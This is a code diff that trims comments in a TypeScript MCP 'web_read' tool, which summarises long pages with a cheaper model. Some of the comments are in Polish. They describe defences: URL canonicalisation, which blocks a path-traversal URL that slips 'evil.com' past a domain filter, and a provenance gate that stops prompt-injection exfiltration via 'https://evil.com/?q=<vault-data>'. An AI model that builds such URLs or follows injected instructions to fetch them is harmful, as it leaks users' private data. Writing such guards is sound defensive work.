@@ -41,11 +41,10 @@ export type WebReadPlugin = NonNullable<ResolverPluginLike> & {
  * web_read — MCP tool for reading full content of a web page.
  * Uses Jina Reader API (r.jina.ai) to extract clean text from any URL.
  *
- * E3.3 — STRESZCZANIE ZAMIAST UCINANIA (DEC L13-5a). Do E3.2 strona dłuższa niż
- * limit była ucinana na twardo w połowie zdania — model dostawał przypadkowy
- * początek i nie wiedział, co przepadło. Teraz długa strona idzie do TANIEGO modelu
- * (slot `researcher` = Badacz), który zwraca streszczenie + dosłowne cytaty.
- * Brak modelu / toggle OFF / błąd LLM → stare, twarde cięcie + nota, co zrobić,
+ * STRESZCZANIE ZAMIAST UCINANIA. Strona dłuższa niż limit idzie do TANIEGO modelu
+ * (slot `researcher` = Badacz), który zwraca streszczenie + dosłowne cytaty — twarde
+ * cięcie w połowie zdania dawałoby model przypadkowy początek, bez wskazówki, co
+ * przepadło. Brak modelu / toggle OFF / błąd LLM → twarde cięcie + nota, co zrobić,
  * żeby dostawać streszczenia. ŚWIADOMIE bez fallbacku na model główny: narzędzie
  * nie ma prawa po cichu palić drogiego modelu.
  */
@@ -75,7 +74,7 @@ export function createWebReadTool() {
                     throw new Error(t('mcp.web_read.error.url_invalid'));
                 }
 
-                // K1 / znalezisko 001: adres kanonizujemy RAZ, na samym wejsciu. Od tej chwili
+                // Adres kanonizujemy RAZ, na samym wejsciu. Od tej chwili
                 // provenance, filtr domen, klucz cache i reader ogladaja DOKLADNIE ten sam ciag.
                 // Bez tego `https://good.com/a/../../../../evil.com/x` przechodzil filtr jako
                 // `good.com`, a po sklejce z readerem zwijal sie do `evil.com`.
@@ -93,7 +92,7 @@ export function createWebReadTool() {
                     };
                 }
 
-                // E1.3 P6 (L13-11): only fetch URLs of known provenance — returned by a
+                // Only fetch URLs of known provenance — returned by a
                 // prior web_search or present in a user message. This blocks the
                 // prompt-injection exfiltration vector where the model is tricked into
                 // reading https://evil.com/?q=<vault-data>. Fail-closed: unknown → refuse.
@@ -104,7 +103,7 @@ export function createWebReadTool() {
                     };
                 }
 
-                // E3.3: filtr domen — odmowa PRZED requestem, fail-closed jak bramka provenance.
+                // Filtr domen — odmowa PRZED requestem, fail-closed jak bramka provenance.
                 if (checkDomain(canonical, webSearchSettings) !== 'allowed') {
                     return {
                         success: false,
